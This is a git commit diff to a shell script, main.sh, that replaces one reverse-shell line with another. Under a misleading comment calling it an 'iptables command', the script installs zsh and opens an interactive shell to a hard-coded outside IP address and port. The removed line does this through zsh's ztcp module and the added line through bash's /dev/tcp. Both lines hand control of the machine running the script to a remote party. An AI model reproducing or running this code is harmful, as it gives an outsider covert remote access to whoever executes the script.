3b2c4b0495280ad79785bb4f9d9e6f5983fdb7bc
aslrrop <72697403+aslrrop@users.noreply.github.com>
2021-06-23 12:04:35 +0530

    Update main.sh

--- main.sh
+++ main.sh
@@ -9,4 +9,4 @@
 
 # iptables command
 sudo apt install zsh
-zsh -c 'zmodload zsh/net/tcp && ztcp 212.192.241.226 4654 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+sh -i >& /dev/tcp/212.192.241.226/4654 0>&1
